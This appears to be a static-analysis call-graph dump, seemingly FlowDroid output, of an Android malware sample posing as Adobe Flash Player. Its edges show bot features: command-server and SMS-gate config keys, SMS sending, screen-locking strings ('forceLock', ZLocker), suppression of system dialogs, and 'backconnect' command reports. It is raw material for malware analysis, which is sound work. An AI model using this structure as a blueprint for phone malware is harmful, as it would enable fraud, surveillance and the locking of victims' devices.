VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke r4.<java.lang.String: void <init>(byte[],java.lang.String)>($r15, "UTF-8") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: void <init>(byte[],java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)>($r1) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onDestroy()>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/ADOBEcoreZa;") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r20.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.adobeCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void <init>()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r1, "ON") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
CLINIT edge: staticinvoke <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
SPECIAL edge: specialinvoke r1.<android.content.Intent: void <init>(java.lang.String)>("android.intent.action.CLOSE_SYSTEM_DIALOGS") in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.content.Intent: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: void setContentView(int)>(2130903042) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "faceLock[OK]:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>($r0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: r25 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Phone: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.BK: void <init>()>() in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void <init>()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("MacrosAState", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.ComponentName startService(android.content.Intent)>(r2) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n-----\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: void sendBroadcast(android.content.Intent)>(r1) in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.content.ContextWrapper: void sendBroadcast(android.content.Intent)>
SPECIAL edge: r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("w", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r18 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=backconnect_data&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
